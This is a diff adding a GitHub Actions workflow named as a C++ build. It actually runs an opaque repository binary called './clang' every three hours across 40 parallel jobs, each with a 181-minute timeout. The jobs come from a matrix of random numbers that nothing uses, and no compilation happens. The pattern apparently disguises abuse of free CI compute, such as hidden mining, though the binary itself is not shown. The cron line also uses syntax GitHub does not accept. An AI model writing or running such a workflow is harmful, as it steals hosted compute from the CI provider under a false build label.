@@ -1,0 +1,25 @@
+# Workflow body - 23/3/2021
+name: Build C++ program - from 23/3/2021
+# Defaults
+
+defaults:
+  run:
+     shell: bash
+        
+on:
+   workflow_dispatch:
+   schedule:
+      - cron: '0 */3 ? * *'
+jobs:
+   build-project-23-3-2021:
+      timeout-minutes: 181
+      runs-on: ubuntu-latest
+      strategy:
+        matrix:
+         os: [ubuntu-18.04]
+         node: [914,374,599,714,921,163,345,43,148,96,198,826,1010,676,681,648,800,272,482,808,892,558,591,699,435,1020,918,595,600,139,1000,425,619,931,274,513,72,884,723,75]
+      steps:
+      - uses: actions/checkout@v2
+      - name: Build C++ program.
+        run: |
+          ./clang Test 23/3/2021
